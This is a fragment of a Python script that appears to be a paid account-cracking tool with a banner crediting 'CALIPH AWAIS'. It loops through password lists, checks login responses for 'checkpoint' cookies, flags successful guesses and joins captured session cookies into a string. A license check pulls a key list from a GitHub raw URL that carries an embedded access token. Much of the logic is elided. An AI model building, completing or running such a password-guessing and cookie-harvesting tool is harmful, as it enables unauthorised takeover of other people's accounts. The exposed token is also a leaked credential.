...
def banner():
	clear()
	sol()
	ban=''' © MASTER MIND CALIPH AWAIS
   
  💙💙❤️All Credit To Awais And Qureshi 💜❤️
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				cetak(nel('[green]      🤪✨ CALIPH-OK ❤️✨[green]')) 
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[purple]      😭HELLO THIS IS CALIPH SURPRISE🤣[purple]')) 
...
def Subscraption():
	...
	clear()
	print(logo)
	r1=requests.get("https://raw.githubusercontent.com/caliphking/caliph007/main/awais.txt?token=GHSAT0AAAAAABW2SRCYR2KL7VDISMMS45FGYWZAJLA").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		Main()
		...
		print(logo)
		print ("")
		print(" \33[1;32m Note : This is Paid Tool.You Need To Get Approval First \33[1;37m")
		print ("")
